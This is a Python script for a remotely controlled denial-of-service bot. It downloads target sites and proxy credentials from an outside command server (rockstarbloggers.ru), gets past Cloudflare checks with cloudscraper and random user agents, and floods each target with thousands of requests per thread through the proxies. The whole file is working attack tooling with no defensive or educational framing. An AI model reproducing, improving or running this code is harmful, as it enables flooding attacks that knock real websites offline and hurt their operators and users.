 # -*- coding: utf-8 -*-
import cloudscraper
import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
from gc import collect
from loguru import logger
from os import system
from requests import get
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads

try:
    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
except:
    sleep(5)
    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
MAX_REQUESTS = 5000
disable_warnings()
logger.remove()
logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = 5


def mainth():
	while True:
		scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
		scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
		logger.info("GET RESOURCES FOR ATTACK")
		content = scraper.get(choice(HOSTS)).content
		if content:
		    data = loads(content)
		else:
		    sleep(5)
		    continue
		logger.info("STARTING ATTACK TO " + data['site']['page'])
		site = unquote(data['site']['page'])
		if site.startswith('http') == False:
		    site = "https://" + site
		try:
		    attack = scraper.get(site)
		    if attack.status_code >= 302 and attack.status_code >= 200:
		        for proxy in data['proxy']:
		            auth = proxy["auth"]
		            ip = proxy["ip"]
		            scraper.proxies.update({'http': ip + "://" +auth, 'https': ip + "://" + auth})
		            response = scraper.get(site)
		            if response.status_code >= 200 and response.status_code <= 302:
		                for i in range(MAX_REQUESTS):
		                    response = scraper.get(site)
		                    logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
		    else:
		        for i in range(MAX_REQUESTS):
		            response = scraper.get(site)
		            logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
		except:
		    logger.warning("issue happened")
		    continue


def cleaner():
	while True:
		sleep(60)
		collect()

if __name__ == '__main__':
	for _ in range(threads):
		Thread(target=mainth).start()

	Thread(target=cleaner, daemon=True).start()
